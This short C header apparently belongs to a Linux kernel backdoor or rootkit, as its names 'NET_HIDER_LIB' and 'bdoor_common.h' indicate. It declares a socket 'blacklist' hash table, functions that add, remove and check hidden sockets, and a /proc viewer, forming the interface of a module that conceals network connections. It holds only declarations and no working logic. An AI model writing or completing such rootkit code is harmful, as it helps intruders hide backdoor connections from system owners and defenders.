#ifndef NET_HIDER_LIB
#define NET_HIDER_LIB 1
#include "bdoor_common.h"
#ifdef CONFIG_X86_64

struct socket_blacklist_entry {
        struct sock_id id;
        struct rhash_head node;
};


extern struct rhashtable_params socket_blacklist_params;
extern atomic_t socket_blacklist_users;
extern struct rhashtable socket_blacklist;
extern spinlock_t socket_blacklist_lock;

void socket_blacklist_free_entry(void *ptr, void *arg);

int process_sockadd_request(struct sock_request *request);
int process_sockrem_request(struct sock_request *request);

int check_socket_blacklist(struct inet_sock *is);

extern struct proc_dir_entry *socket_blacklist_viewer;
extern const struct proc_ops socket_blacklist_ops;
#endif //CONFIG_X86_64
#endif //NET_HIDER_LIB
